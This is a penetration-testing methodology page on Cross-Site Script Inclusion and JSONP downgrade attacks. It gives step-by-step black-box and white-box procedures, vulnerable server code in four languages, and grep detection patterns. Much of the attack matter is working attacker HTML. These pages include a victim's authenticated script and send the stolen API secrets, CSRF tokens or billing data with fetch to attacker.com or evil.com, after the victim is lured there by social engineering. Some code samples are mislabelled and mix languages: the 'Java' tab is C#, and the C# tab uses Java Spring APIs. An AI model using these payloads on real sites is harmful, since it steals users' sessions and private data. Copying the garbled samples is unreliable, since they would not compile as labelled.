# Cross Site Script Inclusion

## Check List

## Methodology

### Black Box

#### XSSI

{% stepper %}
{% step %}
During active reconnaissance, browse through the target application and identify files using the .gtl extension, which are Google Gruyere template files
{% endstep %}

{% step %}
Fuzz the application for .gtl files using a tool such as FFUF, and confirm the presence and accessibility of files such as feed.gtl. Accessing the discovered .gtl file should reveal sensitive information (APIKEY) exposed directly in the file contents
{% endstep %}

{% step %}
Create a malicious page on an attacker-controlled domain (attacker.com/CSSI.html) and insert the following script to extract the sensitive values through XSSI

```javascript
<script>
function _feed(a) {
    alert("private snippet of appspot from remote domain is : " + a['appspot']);
}
</script>

<script src="https://google-gruyere.appspot.com/603401276585510108589243280335984060786/feed.gtl"></script>
```
{% endstep %}

{% step %}
Use social engineering to lure a logged-in victim into visiting the attacker page (attacker.com/CSSI.html). When the victim loads the page while authenticated, the malicious script imports the .gtl file and leaks the sensitive information (such as APIKEY) to the attacker
{% endstep %}
{% endstepper %}

***

#### XSSI&#x20;

{% stepper %}
{% step %}
During initial analysis, review the target application and identify script files that may contain sensitive data. Pay special attention to dynamic JavaScript files or JSONP endpoints that return user-specific information when accessed by authenticated users
{% endstep %}

{% step %}
Verify whether the script is dynamic by sending two requests

* one with authenticated session cookies
* one without authentication
{% endstep %}

{% step %}
If the responses differ, the JavaScript file is dynamic and potentially vulnerable to XSSI. For example, the endpoint

```
https://example.com/p/?info=abc
```

returns user-specific information inside a callback function for authenticated users
{% endstep %}

{% step %}
Create a malicious HTML page on an attacker-controlled domain (attacker.com) and include the callback function and script import to capture the sensitive data

```html
<html>
<script>
function abc(s) {
    alert(JSON.stringify(s));
}
</script>

<script src="https://example.com/p/?info=abc"></script>
</html>
```
{% endstep %}

{% step %}
Use social engineering techniques to lure an authenticated user into visiting the malicious page (attacker.com/index.html). When the victim loads the page while logged in, the remote script is imported and executes in the attacker’s context, causing sensitive information (such as name, number, email, and address) to be exposed to the attacker
{% endstep %}
{% endstepper %}

***

#### XSSI And JSONP Bug

{% stepper %}
{% step %}
Begin by spidering the target application, using both manual navigation and automated crawling. Once responses are populated, filter results in your proxy tool (Burp Suite) by MIME type and review responses marked as script to identify JavaScript files potentially containing sensitive information
{% endstep %}

{% step %}
Inspect any discovered JavaScript files for embedded user data such as personal details, session-related identifiers, or other sensitive values. Confirm whether the script is returned without requiring CORS-triggering request headers such as Authorization, `X-API-KEY`, `X-CSRF-TOKEN`, or other custom authentication headers. If such headers are required, the browser may block cross-domain inclusion unless additional misconfigurations exist
{% endstep %}

{% step %}
Determine whether the script can be included cross-origin by verifying that it loads successfully when referenced in a simple tag. A basic structure would resemble

```javascript
<script src="https://target.com/vuln.js"></script>
<script defer>
// var_name is a variable inside vuln.js that contains exposed data
console.log(var_name);

// Example of exfiltration via request to an attacker-controlled server
fetch("https://evil.com/stealInfo?info=" + var_name);
</script>
```
{% endstep %}

{% step %}
Apply similar testing methodology for JSONP endpoints, using common callback parameters such as `callback=`, `jsonp=`, or `jsoncallback=` on endpoints that return dynamic user-specific content. Test variations because different endpoints often use distinct callback parameter names
{% endstep %}

{% step %}
Some endpoints require multiple parameters to trigger a JSONP response (`?type=jsonp&callback=test`)
{% endstep %}

{% step %}
Even if the response is labeled Content-Type: application/json, JSONP may still execute if X-Content-Type-Options: nosniff is not present
{% endstep %}
{% endstepper %}

***

### White Box

#### Token Exfiltration via Dynamic JavaScript State Hydration (Global Namespace Bleeding)

{% stepper %}
{% step %}
Map the entire target system using Burp Suite within your Kali Linux/WSL environment. Focus on modern Single Page Applications (SPAs) or Backend-For-Frontend (BFF) architectures that require initial state (e.g., user profiles, CSRF tokens, API keys) to boot the frontend framework
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the frontend initialization sequence. Look for scripts loaded directly from the backend API rather than a static CDN (e.g., `<script src="/api/v1/auth/session.js"></script>`)
{% endstep %}

{% step %}
Identify the "State Hydration" architecture. Making an asynchronous `fetch()` request to retrieve the user's session data after the HTML loads causes a slight UI delay (a loading spinner). To optimize boot times, backend developers dynamically generate a JavaScript file containing the user's active session data, mapping it directly to the global `window` object
{% endstep %}

{% step %}
Investigate the Content-Type and Authentication mechanics. The endpoint `/api/v1/auth/session.js` relies on ambient HTTP session cookies to identify the user. Because it returns executable code, the backend explicitly sets the `Content-Type: application/javascript` header
{% endstep %}

{% step %}
Discover the fatal architectural assumption: The developer assumes that because the endpoint requires an authenticated session cookie, the data is protected by the browser's Same-Origin Policy (SOP). They assume external sites cannot read the response
{% endstep %}

{% step %}
Understand the XSSI vulnerability: The Same-Origin Policy applies to data reads (like `fetch` or `XMLHttpRequest`). It does _not_ apply to script execution. The `<script>` tag is explicitly designed to execute cross-origin code. Furthermore, defensive headers like `X-Content-Type-Options: nosniff` are completely useless here because the backend intentionally serves the sensitive data with a valid, executable JavaScript MIME type
{% endstep %}

{% step %}
Formulate the XSSI payload. You must construct an attacker-controlled web page that embeds the target's dynamic script endpoint
{% endstep %}

{% step %}
Construct the payload: `<script src="[https://api.enterprise.tld/v1/auth/session.js](https://api.enterprise.tld/v1/auth/session.js)"></script>`
{% endstep %}

{% step %}
Below this tag, write a secondary script to access the globally declared variable (e.g., `window.INITIAL_STATE`) and exfiltrate it
{% endstep %}

{% step %}
Host the payload on your infrastructure and distribute the link to an authenticated enterprise victim
{% endstep %}

{% step %}
The victim visits your page. The browser parses your `<script>` tag. It makes a cross-origin `GET` request to the enterprise API, automatically attaching the victim's ambient session cookies
{% endstep %}

{% step %}
The enterprise API authenticates the cookies, generates the dynamic JavaScript containing the victim's highly classified data, and returns it
{% endstep %}

{% step %}
The victim's browser executes the script within the context of _your_ malicious page. The victim's sensitive data is loaded into the global `window` object of your page. Your subsequent script silently extracts this data and transmits it to your server, resulting in a flawless, zero-click account takeover

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(return\s+Content\(\$"window\.[a-zA-Z0-9_]+\s*=\s*\{)|(Response\.WriteAsync\("var\s+sessionState\s*=\s*")
```
{% endtab %}

{% tab title="Java" %}
```regexp
(response\.getWriter\(\)\.write\("window\.[a-zA-Z0-9_]+\s*=\s*"\s*\+)|(out\.print\("window\.[a-zA-Z0-9_]+\s*=\s*"\s*\+)|(writer\.write\("var\s+sessionState\s*=\s*")
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(echo\s*"window\.[a-zA-Z0-9_]+\s*=\s*"\s*\.)|(\$response->getBody\(\)->write\("var\s+sessionState\s*=\s*")
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(res\.send\(`\s*window\.[a-zA-Z0-9_]+\s*=\s*\$\{)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"return\s+Content\(\$\"window\.[a-zA-Z0-9_]+\s*=\s*\\{|Response\.WriteAsync\(\"var\s+sessionState\s*=\s*\""
```
{% endtab %}

{% tab title="Java" %}
```regexp
"response\.getWriter\(\)\.write\(\"window\.[a-zA-Z0-9_]+\s*=\s*\"\s*\+|out\.print\(\"window\.[a-zA-Z0-9_]+\s*=\s*\"\s*\+|writer\.write\(\"var\s+sessionState\s*=\s*\""
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"echo\s*\"window\.[a-zA-Z0-9_]+\s*=\s*\"\s*\.|\\$response->getBody\(\)->write\(\"var\s+sessionState\s*=\s*\""
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"res\.send\(`\s*window\.[a-zA-Z0-9_]+\s*=\s*\\$\{"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/api/v1/auth/session.js")]
public async Task<IActionResult> GetSessionScript()
{
    // [1]
    // [2]
    var user = await _authService.GetUserFromCookieAsync(Request.Cookies["AuthSession"]);

    var state = new 
    {
        IsLoggedIn = user != null,
        Role = user?.Role,
        // [3]
        // [4]
        BearerToken = user?.GenerateTemporaryJwt()
    };

    var json = JsonConvert.SerializeObject(state);
    var jsCode = $"var EnterpriseSession = {json};";

    // Returns executable code to bypass CORS/SOP data read restrictions
    return Content(jsCode, "application/javascript");
}
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping("/api/v1/auth/session.js")
public async Task<IActionResult> GetSessionScript()
{
    // [1]
    // [2]
    var user = await _authService.GetUserFromCookieAsync(request.getCookies("AuthSession"));

    var state = new 
    {
        IsLoggedIn = user != null,
        Role = user?.Role,
        // [3]
        // [4]
        BearerToken = user?.GenerateTemporaryJwt()
    };

    var json = JsonConvert.SerializeObject(state);
    var jsCode = $"var EnterpriseSession = {json};";

    // Returns executable code to bypass CORS/SOP data read restrictions
    return Content(jsCode, "application/javascript");
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SessionController extends Controller
{
    public function getSessionScript(Request $request)
    {
        // [1]
        // [2]
        $user = auth()->user();

        $state = [
            'loggedIn' => (bool)$user,
            // [3]
            // [4]
            'api_key' => $user ? $user->api_key : null,
            'csrf_token' => csrf_token()
        ];

        $jsCode = "window.USER_CONTEXT = " . json_encode($state) . ";";

        return response($jsCode)
                ->header('Content-Type', 'application/javascript');
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// [1]
// [2]
// Dynamic route serving executable JavaScript based on ambient session cookies
router.get('/api/v1/auth/session.js', async (req, res) => {
    
    // Validates ambient cookies perfectly
    let user = await checkSession(req.cookies.sessionId); 

    let initialState = {
        isAuthenticated: !!user,
        userId: user ? user.id : null,
        email: user ? user.email : null,
        // [3]
        // [4]
        // Highly sensitive authentication tokens rendered into the payload
        csrfToken: user ? generateCsrfToken(user.id) : null,
        apiSecret: user ? user.apiKey : null
    };

    // Setting the valid JS MIME type entirely bypasses 'nosniff' browser defenses
    res.setHeader('Content-Type', 'application/javascript');
    
    // The developer binds the private state to the global window object,
    // assuming only their own frontend SPA will execute this script.
    res.send(`window.__APP_INITIAL_STATE__ = ${JSON.stringify(initialState)};`);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture prioritizes ultra-fast frontend rendering (often eliminating the "loading spinner" phase) by injecting the user's localized state directly into the browser's JavaScript environment upon application boot, \[2] The backend securely validates the user's ambient session cookies before querying the database, ensuring the endpoint itself is not an Unauthenticated Data Exposure flaw, \[3] The architecture relies entirely on the assumption that Cross-Origin Resource Sharing (CORS) policies provide blanket immunity against all cross-site data theft, \[4] The execution sink. The developers failed to recognize that the `<script>` tag is an intentional, spec-compliant bypass of the Same-Origin Policy. By dynamically encoding highly sensitive user data into a valid `application/javascript` response, the backend unwittingly authorizes any external domain to execute the payload. The attacker merely embeds the endpoint within a script tag. The victim's browser authenticates the request, executes the code within the attacker's DOM context, and maps the victim's cryptographic tokens to the attacker's global `window` object, resulting in total session hijacking

```http
<!-- 1. Attacker hosts this payload on an external domain: https://attacker-site.com/exploit.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Enterprise Security Update</title>
</head>
<body>
    <h1>Please wait...</h1>

    <!-- 2. The attacker uses a script tag to include the target's dynamic state endpoint. -->
    <!-- The browser automatically attaches the victim's cookies for api.enterprise.tld. -->
    <script src="https://api.enterprise.tld/v1/auth/session.js"></script>

    <script>
        // 3. The enterprise API returns: window.__APP_INITIAL_STATE__ = {"apiSecret": "sk_live_123..."};
        // 4. This code executes sequentially. The attacker waits a few milliseconds 
        //    (or uses onload events) and accesses the globally leaked variable.
        setTimeout(() => {
            if (window.__APP_INITIAL_STATE__) {
                const stolenToken = window.__APP_INITIAL_STATE__.apiSecret;
                const stolenCsrf = window.__APP_INITIAL_STATE__.csrfToken;

                // 5. Exfiltrate the sensitive tokens to the attacker's server.
                fetch('https://attacker.com/leak', {
                    method: 'POST',
                    body: JSON.stringify({ token: stolenToken, csrf: stolenCsrf })
                });
            }
        }, 500);
    </script>
</body>
</html>
```
{% endstep %}

{% step %}
To eliminate synchronous loading delays in modern SPAs, architects decoupled initial state retrieval from standard REST APIs, migrating the data payload into dynamically generated, server-side JavaScript files. This optimization shifted the data transport mechanism from `XMLHttpRequest/Fetch` into native DOM execution rendering. The security failure stemmed from a profound misclassification of browser isolation policies. Developers equated the Same-Origin Policy (SOP) with absolute data protection, forgetting that HTML script inclusion specifically bypasses SOP to permit decentralized code execution. By embedding private, unencrypted session artifacts inside valid executable JavaScript, the backend effectively negated all ambient cookie protections. The attacker exploited this by embedding the dynamic endpoint on a hostile origin. The victim's browser complied with standard web specifications, retrieving the authenticated JavaScript and executing it within the attacker's execution context, causing catastrophic global namespace bleeding and comprehensive data exfiltration
{% endstep %}
{% endstepper %}

***

#### Cross-Origin Data Theft via Legacy JSONP Middleware Downgrade

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise APIs that have recently undergone modernization (e.g., migrating from monolithic SOAP/XML architectures to modern REST JSON APIs), but still maintain undocumented endpoints to support legacy third-party integrators or older mobile applications
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the API Gateway's global request middleware and response formatters
{% endstep %}

{% step %}
Identify the "Global JSONP Polyfill" architecture. To ensure backward compatibility with ancient web applications that predated modern CORS implementations, enterprise developers often implemented JSON with Padding (JSONP)
{% endstep %}

{% step %}
Investigate the API execution pipeline. The modern REST API is strictly designed to return `application/json`, which is heavily protected by CORS policies and the `X-Content-Type-Options: nosniff` header
{% endstep %}

{% step %}
Analyze the legacy fallback mechanism. The developers implemented a global interceptor (middleware). If an incoming HTTP request contains a specific query parameter (e.g., `?callback=` or `?jsonp=`), the middleware intercepts the outgoing JSON response, prepends the requested callback string, appends a closing parenthesis, and forcefully rewrites the `Content-Type` header to `application/javascript`
{% endstep %}

{% step %}
Discover the fatal boundary collapse: The modern API engineers heavily secured the internal controllers (e.g., `/api/v1/finance/account-details`), assuming the response format was mathematically secure. They completely forgot about the global legacy middleware running at the Edge or Gateway level
{% endstep %}

{% step %}
Understand the vulnerability: JSONP fundamentally operates by wrapping sensitive JSON data inside a JavaScript function call (e.g., `attackerFunction({"balance": 500000})`). Because the middleware alters the `Content-Type` to `application/javascript`, modern browser defenses like CORB (Cross-Origin Read Blocking) and `nosniff` are completely disabled
{% endstep %}

{% step %}
Formulate the JSONP Downgrade payload. Identify a highly sensitive, authenticated API endpoint that returns JSON (e.g., `[https://api.enterprise.tld/v1/users/me/billing](https://api.enterprise.tld/v1/users/me/billing)`)
{% endstep %}

{% step %}
Confirm the middleware's existence by appending `?callback=testExfil` to the URL. If the response transforms from `{"data": "secret"}` to `testExfil({"data": "secret"})`, the downgrade is successful
{% endstep %}

{% step %}
Construct a malicious HTML page. Define the callback function globally in your attacker script: `function exfiltrate(data) { fetch('[https://attacker.com/leak](https://attacker.com/leak)', {method: 'POST', body: JSON.stringify(data)}); }`
{% endstep %}

{% step %}
Embed the target API using a script tag: `<script src="[https://api.enterprise.tld/v1/users/me/billing?callback=exfiltrate](https://api.enterprise.tld/v1/users/me/billing?callback=exfiltrate)"></script>`
{% endstep %}

{% step %}
Distribute the payload to the victim
{% endstep %}

{% step %}
The victim's browser initiates the cross-origin script request, attaching their enterprise session cookies
{% endstep %}

{% step %}
The enterprise API authenticates the request, generates the sensitive JSON, and routes it to the exit pipeline. The global middleware detects the `callback` parameter, wraps the classified JSON in the attacker's function name, and serves it as executable code
{% endstep %}

{% step %}
The browser executes the script, invoking the attacker's global function with the victim's classified data as the primary argument, bypassing all modern CORS protections through architectural regression

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
if\s*\(!string\.IsNullOrEmpty\([a-zA-Z0-9_]+\.Query\["callback"\]\)\)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(@ControllerAdvice\s+.*AbstractJsonpResponseBodyAdvice)|(request\.getParameter\("callback"\)\s*!=\s*null)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
if\s*\(isset\(\$_GET\['callback'\]\)\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
if\s*\(\s*req\.query\.callback\s*\)\s*\{\s*res\.type\(['"]application/javascript['"]\)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
"if\s*\(!string\.IsNullOrEmpty\([a-zA-Z0-9_]+\.Query\[\"callback\"\]\)\)"
```
{% endtab %}

{% tab title="Java" %}
```regexp
"@ControllerAdvice\s+.*AbstractJsonpResponseBodyAdvice|request\.getParameter\(\"callback\"\)\s*!=\s*null"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
"if\s*\(isset\(\\\$_GET\['callback'\]\)\)"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
"if\s*\(\s*req\.query\.callback\s*\)\s*\{\s*res\.type\(['\"]application/javascript['\"]\)"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
// [1]
// [2]
// ASP.NET Core historically supported custom JSONP response handlers.
// Although deprecated in newer versions, legacy enterprise codebases often
// retain custom implementations to maintain integrations.

[ControllerAdvice]
public class JsonpAdvice : AbstractMappingJacksonResponseBodyAdvice
{

    protected override void BeforeBodyWriteInternal(
        MappingJacksonValue bodyContainer,
        MediaType contentType,
        MethodParameter returnType,
        ServerHttpRequest request,
        ServerHttpResponse response)
    {

        HttpServletRequest servletRequest =
            ((ServletServerHttpRequest)request)
            .getServletRequest();


        // [3]
        // [4]
        // Extracts the attacker's callback name
        string callback =
            servletRequest.getParameter("callback");


        if (callback != null)
        {
            // Re-wraps the secure DTO into a JSONP object
            bodyContainer.SetJsonpFunction(callback);

            response.Headers.ContentType =
                new MediaType(
                    "application",
                    "javascript"
                );
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
// [1]
// [2]
// Spring Boot historically supported AbstractJsonpResponseBodyAdvice.
// Although deprecated in newer versions, legacy enterprise codebases often 
// retain custom implementations to maintain integrations.
@ControllerAdvice
public class JsonpAdvice extends AbstractMappingJacksonResponseBodyAdvice {

    @Override
    protected void beforeBodyWriteInternal(MappingJacksonValue bodyContainer, MediaType contentType,
                                           MethodParameter returnType, ServerHttpRequest request,
                                           ServerHttpResponse response) {

        HttpServletRequest servletRequest = ((ServletServerHttpRequest) request).getServletRequest();
        
        // [3]
        // [4]
        // Extracts the attacker's callback name
        String callback = servletRequest.getParameter("callback");

        if (callback != null) {
            // Re-wraps the secure DTO into a JSONP object
            bodyContainer.setJsonpFunction(callback);
            response.getHeaders().setContentType(new MediaType("application", "javascript"));
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class JsonpDowngradeMiddleware
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);

        // [1]
        // [2]
        // [3]
        // [4]
        if ($request->has('callback') && $response instanceof JsonResponse) {
            $callback = $request->query('callback');
            
            // Laravel's withCallback natively alters the response to JSONP
            return $response->withCallback($callback);
        }

        return $response;
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// [1]
// [2]
// Global middleware applied across the entire API ecosystem
app.use((req, res, next) => {
    const originalSend = res.send;

    res.send = function (body) {
        // [3]
        // [4]
        // The developer left this legacy JSONP polyfill active to support 
        // older mobile app integrations. If the callback query param exists,
        // it fundamentally alters the payload structure and MIME type.
        if (req.query.callback) {
            const callbackName = req.query.callback.replace(/[^a-zA-Z0-9_.]/g, '');
            
            // Downgrades the secure JSON response into executable JavaScript
            res.setHeader('Content-Type', 'application/javascript');
            res.setHeader('X-Content-Type-Options', 'nosniff'); // Useless because MIME is JS
            
            originalSend.call(this, `${callbackName}(${body});`);
        } else {
            originalSend.call(this, body);
        }
    };
    next();
});

// A highly secure REST endpoint, completely unaware of the global middleware
router.get('/api/v1/finance/account-details', requireAuth, async (req, res) => {
    let accountInfo = await db.Accounts.getDetails(req.user.id);
    
    // Developer assumes this will ALWAYS be returned as application/json
    res.json(accountInfo); 
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The enterprise architecture recently modernized its API layers, transitioning from XML/JSONP integrations to strict RESTful JSON, \[2] To prevent catastrophic breakage of unmaintained partner integrations or legacy mobile clients, engineers retained a global middleware component designed to synthesize JSONP responses on demand, \[3] The architecture assumes that modern endpoints returning highly classified data (like financial ledgers or healthcare records) are implicitly shielded by the browser's modern CORS implementations, \[4] The execution sink. Developers isolated their security models by application layer. The API controller engineers securely authored REST endpoints, oblivious to the fact that the Edge gateway retained the capability to arbitrarily transcode any JSON response into executable JavaScript. The attacker exploits this global downgrade mechanic by appending the legacy `callback` parameter to a strictly modern, highly restricted API route. The middleware intercepts the secure JSON envelope, injects the attacker's function wrapper, and alters the MIME type. This architectural regression entirely bypasses modern Cross-Origin Read Blocking (CORB), enabling the attacker to seamlessly exfiltrate classified data using elementary HTML script inclusion

```html
<!-- 1. Attacker controls an external domain: https://hackerone-poc.attacker.com/exploit.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Enterprise Integration</title>
</head>
<body>
    <h1>Loading Dashboard...</h1>

    <script>
        // 2. The attacker defines the callback function in the global namespace.
        // This function will be executed when the enterprise API returns the payload.
        function exfiltrateData(sensitivePayload) {
            console.log("JSONP Payload intercepted:", sensitivePayload);
            
            // 3. The attacker transmits the victim's data to their drop server.
            fetch('https://attacker.com/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(sensitivePayload)
            });
        }
    </script>

    <!-- 4. The attacker initiates the Cross-Site Script Inclusion (XSSI). -->
    <!-- They target the modern, secure REST endpoint but append the undocumented '?callback=' trigger. -->
    <!-- The victim's browser sends the request along with their ambient enterprise session cookies. -->
    <script src="https://api.enterprise.tld/v1/users/me/billing?callback=exfiltrateData"></script>

    <!-- 5. The enterprise API normally returns:
            {"creditCard": "4111...", "balance": 99000, "status": "active"} 
         
         6. The legacy middleware intercepts and downgrades the response to:
            exfiltrateData({"creditCard": "4111...", "balance": 99000, "status": "active"});
         
         7. The response Content-Type is 'application/javascript'.
         8. The browser executes the script, passing the JSON directly into the attacker's 
            exfiltrateData() function, bypassing all Same-Origin Policy (SOP) restrictions. -->
</body>
</html>
```
{% endstep %}

{% step %}
To maintain backward compatibility during widespread platform modernization, infrastructure architects deployed global compatibility middleware capable of dynamically downgrading RESTful JSON responses into legacy JSONP formats. This architecture created a fatal misalignment between component-level security assumptions and global routing capabilities. API engineers developed secure, modern endpoints under the assumption that browsers would enforce strict Cross-Origin Resource Sharing (CORS) and Cross-Origin Read Blocking (CORB) against unauthorized external queries. However, by supplying a specific query parameter, the attacker forced the global middleware to intervene. The middleware unsealed the secure JSON payload, wrapped it in an attacker-defined executable function, and transmuted the HTTP Content-Type into valid JavaScript. This architectural override explicitly circumvented the browser's modern data-protection perimeters, transforming a highly secure REST API into an open conduit for unmitigated Cross-Site Script Inclusion and authenticated data theft
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
